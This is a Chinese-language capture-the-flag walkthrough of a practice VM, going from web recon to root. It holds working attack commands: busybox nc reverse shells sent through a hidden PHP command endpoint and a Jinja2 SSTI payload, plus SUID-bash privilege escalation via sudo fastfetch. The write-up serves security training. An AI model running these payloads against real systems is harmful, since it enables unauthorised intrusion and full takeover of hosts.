靶机名字: eeeeeasy（群友机器，可能后面会发布在hackmyvm）

哈，看这名字，是想说 "太简单啦" 还是 "eeee...easy?" 不管了，开干！

### 1. 信息收集 - 找到你了！

老规矩，先用 `arp-scan` 在内网里扫一圈，看看目标在哪儿。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       (Unknown)
192.168.205.2   00:50:56:f4:ef:6f       (Unknown)
192.168.205.213 08:00:27:70:f3:fd       (Unknown)  # <--- 目标出现！
192.168.205.254 00:50:56:f5:17:d6       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.926 seconds (132.92 hosts/sec). 4 responded
```
目标IP是 `192.168.205.213`，祭出`nmap`大法，先来个全端口快速扫描。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate 10000 192.168.205.213            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 04:39 EDT
Nmap scan report for 192.168.205.213
Host is up (0.00021s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
MAC Address: 08:00:27:70:F3:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.08 seconds
```
开了22 (SSH), 80 (HTTP), 443 (HTTPS) 端口。再来个详细点的服务版本探测。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p22,80,443 -sV 192.168.205.213
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 04:39 EDT
Nmap scan report for 192.168.205.213
Host is up (0.00029s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.62 ((Debian))
443/tcp open  ssl/http Apache httpd 2.4.62 ((Debian))
MAC Address: 08:00:27:70:F3:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.53 seconds
```
SSH是OpenSSH 8.4p1，Web服务是Apache 2.4.62 (Debian)。看来突破口很可能在Web上。

### 2. Web渗透 - 藏得挺深啊！

先用`curl`看看80和443端口的首页是啥。

```bash
┌──(kali㉿kali)-[~]
└─$ curl -v http://192.168.205.213:80
*   Trying 192.168.205.213:80...
* Connected to 192.168.205.213 (192.168.205.213) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.205.213
> User-Agent: curl/8.13.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sat, 17 May 2025 08:40:10 GMT
< Server: Apache/2.4.62 (Debian)
< Last-Modified: Sat, 12 Apr 2025 01:53:17 GMT
< ETag: "6-6328b152a4f57"
< Accept-Ranges: bytes
< Content-Length: 6
< Content-Type: text/html
< 
index
* Connection #0 to host 192.168.205.213 left intact
                                                                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ curl -vk https://192.168.205.213:443
*   Trying 192.168.205.213:443...
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS
* ALPN: server accepted http/1.1
* Server certificate:
*  subject: CN=PyCrt.PyCrt
*  start date: Apr  1 14:05:29 2025 GMT
*  expire date: Mar 30 14:05:29 2035 GMT
*  issuer: CN=PyCrt.PyCrt
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* Connected to 192.168.205.213 (192.168.205.213) port 443
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.205.213
> User-Agent: curl/8.13.0
> Accept: */*
> 
* Request completely sent off
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/1.1 200 OK
< Date: Sat, 17 May 2025 08:40:19 GMT
< Server: Apache/2.4.62 (Debian)
< Last-Modified: Sat, 12 Apr 2025 01:53:17 GMT
< ETag: "6-6328b152a4f57"
< Accept-Ranges: bytes
< Content-Length: 6
< Content-Type: text/html
< 
index
* Connection #0 to host 192.168.205.213 left intact
```
80和443端口内容都是 "index"，HTTPS用的是自签名证书 `CN=PyCrt.PyCrt`。没啥信息，上目录爆破工具 `gobuster`。

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.205.213:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.213:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 6]
/.php                 (Status: 403) [Size: 280]
/hacker               (Status: 301) [Size: 319] [--> http://192.168.205.213/hacker/] # <--- 发现新大陆
Progress: 43164 / 1102800 (3.91%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 43918 / 1102800 (3.98%)
===============================================================
Finished
===============================================================
```
扫出来一个 `/hacker/` 目录，有点意思。浏览器访问看看。

![image-20250517164328109](https://7r1UMPH.top/image/20250517164328580.webp)

是个静态页面，继续对 `/hacker/` 目录进行爆破。

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.205.213/hacker/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.213/hacker/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 40821]
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/img                  (Status: 301) [Size: 323] [--> http://192.168.205.213/hacker/img/]
/css                  (Status: 301) [Size: 323] [--> http://192.168.205.213/hacker/css/]
/js                   (Status: 301) [Size: 322] [--> http://192.168.205.213/hacker/js/]
Progress: 40053 / 1102800 (3.63%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 42645 / 1102800 (3.87%)
===============================================================
Finished
===================================
```
爆破结果都是些常规目录，`index.html`, `img`, `css`, `js`。看来得去看看页面源码了，尤其是JS文件。
在浏览器中访问 `https://192.168.205.213/hacker/js/` ，看到一个叫`hacker.js`的JS文件

![image-20250517164504164](https://7r1UMPH.top/image/20250517164504335.webp)

在 `hacker.js` 的底部发现了一段有意思的JavaScript代码：
```javascript
document.addEventListener('keydown', function (e) {
    if (e.ctrlKey && e.shiftKey && e.key === 'Z') {
        let cmd = prompt('è¯·è¾“å…¥è°ƒè¯•å‘½ä»¤:'); // 提示：请输入调试命令
        if (cmd) {
            fetch('./supercoool.php?cmd=' + encodeURIComponent(cmd))
                .then(res => res.text())
                .then(txt => {
                    alert('å‘½ä»¤è¾“å‡ºï¼š\n' + txt); // 提示：命令输出
                });
        }
    }
});
```
好家伙！这藏了个后门啊！当在 `https://192.168.205.213/hacker/` 页面按下 `Ctrl + Shift + Z` 组合键时，会弹出一个输入框，让你输入命令，然后通过 `supercoool.php` 这个文件以GET请求的`cmd`参数来执行。

直接用`curl`来利用这个后门，先试试执行`id`命令。

```bash
┌──(kali㉿kali)-[~]
└─$ curl -k "https://192.168.205.213/hacker/supercoool.php?cmd=id"
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>                                                                              
```
成功执行！当前用户是 `www-data`。那必须弹个shell回来了。

本地Kali开个`nc`监听：
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888                       
listening on [any] 8888 ...
```
然后通过`curl`发送反弹shell的payload。靶机上有`busybox nc`，用它来反弹。

```bash
┌──(kali㉿kali)-[~]
└─$ curl -k "https://192.168.205.213/hacker/supercoool.php?cmd=busybox+nc+192.168.205.206+8888+-e+/bin/bash"
```
回到`nc`监听窗口：
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888                       
listening on [any] 8888 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.213] 53242
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
成功拿到 `www-data` 的shell！

### 3. 权限提升 - www-data -> qaq -> root

#### 3.1 www-data -> user.txt & qaq

先来一套组合拳稳定一下shell：
```bash
script /dev/null -c bash
# Ctrl+Z 
stty raw -echo; fg
# (回车)
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```
尝试 `sudo -l`：
```bash
www-data@eeeeeasy:/var/www/html/hacker$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
sudo: a password is required
```
需要密码，此路不通。去 `/home` 目录看看有啥用户：
```bash
www-data@eeeeeasy:/var/www/html/hacker$ cd /home/
www-data@eeeeeasy:/home$ ls -al
total 16
drwxr-xr-x  4 root    root    4096 May 16 07:05 .
drwxr-xr-x 18 root    root    4096 Mar 18 20:37 ..
drwxr-xr-x  3 qaq     qaq     4096 May 16 11:04 qaq
drwxr-xr-x  2 welcome welcome 4096 May 16 11:06 welcome
```
有两个用户 `qaq` 和 `welcome`。先去 `welcome` 家看看有啥好东西。
```bash
www-data@eeeeeasy:/home$ cd welcome/
www-data@eeeeeasy:/home/welcome$ ls -al
total 32
drwxr-xr-x 2 welcome welcome 4096 May 16 11:06 .
drwxr-xr-x 4 root    root    4096 May 16 07:05 ..
-rw------- 1 welcome welcome   13 May 16 11:06 .bash_history
-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
-rw-r--r-- 1 root    root      19 May 16 10:48 .viminfo
-rw-r--r-- 1 root    root      44 May 16 11:02 user.txt # <--- user flag!
www-data@eeeeeasy:/home/welcome$ cat user.txt 
flag{user-376760a7c735a606d4f8d8340bad4184}
```
直接拿到了 `user.txt`！看来权限设置有点松。

接下来看看能不能提到 `qaq` 或者 `root`。
检查SUID文件和定时任务：
```bash
www-data@eeeeeasy:/home/welcome$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
www-data@eeeeeasy:/home/welcome$ crontab -l
no crontab for www-data
```
SUID文件没啥特别的，定时任务也没有。
去 `/opt/` 目录瞅瞅：
```bash
www-data@eeeeeasy:/tmp$ cd /opt/
www-data@eeeeeasy:/opt$ ls -al
total 12
drwxr-xr-x  3 root root 4096 May 16 10:07 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
drwxr-x---  4 qaq  qaq  4096 May 16 11:00 flask-app # <--- 归属于qaq用户
```
发现一个 `/opt/flask-app` 目录，属于 `qaq` 用户。看看进程里有没有相关的。
```bash
www-data@eeeeeasy:/opt$ ps aux | grep "flask"
qaq          555  0.0  1.3  35132 27836 ?        S    04:39   0:00 /opt/flask-app/venv/bin/python3 /opt/flask-app/app.py
qaq          556  0.1  1.3 182880 28364 ?        Sl   04:39   0:01 /opt/flask-app/venv/bin/python3 /opt/flask-app/app.py
www-data     773  0.0  0.0   3176   696 pts/0    S+   05:04   0:00 grep flask
```
果然，`qaq` 用户正在运行 `/opt/flask-app/app.py`。看看它监听了什么端口。
```bash
www-data@eeeeeasy:/opt$ ss -tulnp
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      
tcp     LISTEN   0        128            127.0.0.1:5000          0.0.0.0:*  # <--- Flask App
tcp     LISTEN   0        128                 [::]:22               [::]:*      
tcp     LISTEN   0        128                    *:443                 *:*      
tcp     LISTEN   0        128                    *:80                  *:*     
```
这个Flask应用监听在 `127.0.0.1:5000`。用`curl`访问一下。
```bash
www-data@eeeeeasy:/opt$ curl 127.0.0.1:5000

    <html>
        <head><title>SurveyMaster - 填写问卷</title>
<style>
    /* ... CSS styles ... */
</style>
</head>
        <body>
            <div class="container">
                <h1>SurveyMaster</h1>
                <p>提交你的问卷，分享你的想法！</p>
                <form action="/submit" method="POST">
                    <input type="text" name="username" placeholder="你的名字" required>
                    <input type="text" name="question" placeholder="问卷问题" required>
                    <textarea name="answer" placeholder="你的答案" required></textarea>
                    <input type="submit" value="提交问卷">
                </form>
            </div>
        </body>
    </html>
```
是个问卷提交页面。Flask应用，常用的模板引擎是Jinja2，这就有SSTI的可能了。
尝试在POST请求的各个参数 (`username`, `question`, `answer`) 中插入 `{{7*7}}` 来测试SSTI。

```bash
www-data@eeeeeasy:/opt$ sh # 切换到sh方便多次执行curl
$ curl -X POST -d "username={{7*7}}&question=test&answer=test" http://127.0.0.1:5000/submit
# ... (输出显示用户名为 {{7*7}}，没有 SSTI) ...
$ curl -X POST -d "username=test&question={{7*7}}&answer=test" http://127.0.0.1:5000/submit
# ... (输出显示问题为 {{7*7}}，没有 SSTI) ...
$ curl -X POST -d "username=test&question=test&answer={{7*7}}" http://127.0.0.1:5000/submit

        <html>
            <head><title>SurveyMaster - 问卷提交</title>
            <!-- ... CSS ... -->
            </head>
            <body>
                <div class="container">
                    <h1>问卷提交成功</h1>
                    <p>提交者: test</p>
                    <p>问题: test</p>
                    <p>答案: 49</p>  <!-- bingo！ -->
                    <p><a href="/preview/test">查看你的问卷</a> | <a href="/">继续填写</a></p>
                </div>
            </body>
        </html>
```
漂亮！当`answer`字段的值是 `{{7*7}}` 时，返回的页面中答案显示为 `49`。这明确地证明了 `answer` 字段存在SSTI漏洞！

构造SSTI payload来执行命令，获取`qaq`用户的权限。
```bash
$ curl -X POST -d "username=test&question=test&answer={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}" http://127.0.0.1:5000/submit

        <html>
            <!-- ... HTML structure ... -->
            <body>
                <div class="container">
                    <h1>问卷提交成功</h1>
                    <p>提交者: test</p>
                    <p>问题: test</p>
                    <p>答案: uid=1001(qaq) gid=1001(qaq) groups=1001(qaq)  # <--- 命令执行成功！
</p>
                    <p><a href="/preview/test">查看你的问卷</a> | <a href="/">继续填写</a></p>
                </div>
            </body>
        </html>
```
成功以`qaq`用户身份执行了`id`命令。现在，弹个`qaq`用户的shell回来。

Kali上再次监听：
```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```
通过SSTI发送反弹shell payload：
```bash
$ curl -X POST -d "username=test&question=test&answer={{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.205.206 8888 -e /bin/bash').read() }}" http://127.0.0.1:5000/submit
```
回到Kali的`nc`监听：
```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.213] 42084
id
uid=1001(qaq) gid=1001(qaq) groups=1001(qaq)
```
成功拿到 `qaq` 用户的shell！

#### 3.2 qaq -> root

再次稳定shell：
```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
# (press enter)
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```
现在是 `qaq` 用户了，看看有什么`sudo`权限或者SUID程序可以利用。
```
qaq@eeeeeasy:~$ sudo -l
Matching Defaults entries for qaq on eeeeeasy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User qaq may run the following commands on eeeeeasy:
    (ALL) NOPASSWD: /usr/bin/fastfetch
```

这里我们发现 `/usr/bin/fastfetch` 这个程序有点特殊。我们可以用 `sudo` 执行它
先看看 `fastfetch -h` 有没有什么可以利用的参数：

```bash
qaq@eeeeeasy:~$ sudo /usr/bin/fastfetch -h
Fastfetch is a neofetch-like tool for fetching system information and displaying them in a pretty way

Usage: fastfetch <?options>
# ... (大量帮助信息，我们主要关注能执行命令的) ...
Module specific options:
      --command-shell <str>                  Set the shell program to execute the command text
      --command-key <str>                    Set the module key to display
      --command-text <str>                   Set the command text to be executed # <--- 这个看起来很危险！
# ... (更多帮助信息) ...
```
从帮助信息中，`--command-text <str>` 这个选项允许我们执行任意命令，配合 `--structure "command"` 就可以用 `fastfetch` 来执行我们想执行的命令了，并且是以`sudo`（即root）权限执行！

(为什么一定要加上`structure`，因为要使用它告诉`fastfetch`加载`command`)

利用这个特性，我们让`fastfetch`复制 `/bin/bash` 到 `/tmp/sh`，并给 `/tmp/sh` 加上SUID权限位。
```bash
qaq@eeeeeasy:~$ sudo /usr/bin/fastfetch --structure "command" --command-text "cp /bin/bash /tmp/sh && chmod +s /tmp/sh"
       _,met$$$$$gg.
    ,g$$$$$$$$$$$$$$$P.
  ,g$$P"         """Y$$.".
 ,$$P'               `$$$.
',$$P       ,ggs.     `$$b:
`d$$'     ,$P"'   .    $$$
 $$P      d$'     ,    $$$P
 $$:      $.   -    ,d$$'
 $$;      Y$b._   _,d$P'
 Y$$.    `.`"Y$$$$P"'
 `$$b      "-.__
  `Y$$
   `Y$$.
     `$$b.
       `Y$$b.
          `"Y$b._
             `"""
```
检查一下 `/tmp/sh` 的权限：
```bash
qaq@eeeeeasy:~$ ls -la /tmp/
total 1184
drwxrwxrwt 10 root root    4096 May 17 05:14 .
drwxr-xr-x 18 root root    4096 Mar 18 20:37 ..
drwxrwxrwt  2 root root    4096 May 17 04:38 .font-unix
drwxrwxrwt  2 root root    4096 May 17 04:38 .ICE-unix
-rwsr-sr-x  1 root root 1168776 May 17 05:13 sh # <--- SUID位已设置，所有者是root
drwx------  3 root root    4096 May 17 04:38 systemd-private-136e6172f431486383a8b142a9e39960-apache2.service-3yeZai
# ...
```
可以看到 `/tmp/sh` 已经是 `root` 用户所有，并且设置了SUID和SGID位。
现在直接执行 `/tmp/sh -p` 来获取root权限的shell (`-p` 参数使得bash不会因为euid不同而放弃特权)。

```bash
qaq@eeeeeasy:~$ /tmp/sh -p
sh-5.0# id
uid=1001(qaq) gid=1001(qaq) euid=0(root) egid=0(root) groups=0(root),1001(qaq)
```
Boom! `euid=0(root)`，成功拿到root权限！

最后一步，读取root flag：
```bash
sh-5.0# cat /root/root.txt 
flag{root-818a8bc5d566d7c856f14eec2791cd78}
```

收工！打完收flag，美滋滋！

